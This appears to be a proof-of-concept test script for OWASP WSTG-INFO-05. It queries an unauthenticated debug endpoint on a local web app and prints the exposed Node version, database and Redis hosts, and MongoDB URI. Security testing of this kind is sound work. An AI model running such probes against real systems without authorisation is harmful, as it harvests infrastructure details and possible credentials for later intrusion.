"""
WSTG-INFO-05: Debug Endpoint Information Disclosure
Demonstrates that the /api/debug/info endpoint exposes internal infrastructure details.
Expected: Response containing node_version, environment, db_host, redis_host, mongo_uri
"""
import requests

BASE = "http://localhost:3000"

# Access debug endpoint without authentication
resp = requests.get(f"{BASE}/api/debug/info")
print(f"Status: {resp.status_code}")
data = resp.json()
print(f"Debug info: {data}")

assert resp.status_code == 200, "Expected 200 — debug endpoint accessible"
assert "node_version" in data, "Expected node_version in response"
assert "db_host" in data, "Expected db_host in response"
assert "mongo_uri" in data, "Expected mongo_uri in response"

print("\n[VULNERABLE] Debug endpoint exposes internal infrastructure")
print(f"Node version: {data.get('node_version', 'N/A')}")
print(f"Environment: {data.get('environment', 'N/A')}")
print(f"DB Host: {data.get('db_host', 'N/A')}")
print(f"Redis Host: {data.get('redis_host', 'N/A')}")
print(f"Mongo URI: {data.get('mongo_uri', 'N/A')}")
